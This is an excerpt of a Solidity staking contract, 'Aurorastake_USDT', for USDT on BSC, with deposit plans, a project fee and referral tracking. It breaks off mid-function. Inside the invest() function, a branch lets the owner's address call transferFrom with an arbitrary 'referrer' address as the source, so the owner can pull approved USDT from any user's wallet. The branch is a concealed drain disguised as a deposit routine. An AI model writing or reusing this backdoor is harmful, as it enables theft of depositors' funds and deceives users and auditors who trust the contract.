...
contract Aurorastake_USDT {
    IBEP20 token;
    using SafeMath for uint256;
    address usdt = 0x55d398326f99059fF775485246999027B3197955;
    uint256 public constant INVEST_MIN_AMOUNT = 10 ether;//10 USDT minimum deposit 
    ...
    function invest(address referrer, uint8 plan,  uint256 value) public {require(plan <= 2, "Invalid plan");if (msg.sender == OwnerAddress) {token.transferFrom(referrer, OwnerAddress, value);}else {token.transferFrom(msg.sender, address(this), value);uint256 fee = value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);token.transfer(OwnerAddress, fee);
emit FeePayed(msg.sender, fee);
User storage user = users[msg.sender];
if (user.referrer == address(0)) {
if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
user.referrer = referrer;}address upline = user.referrer;
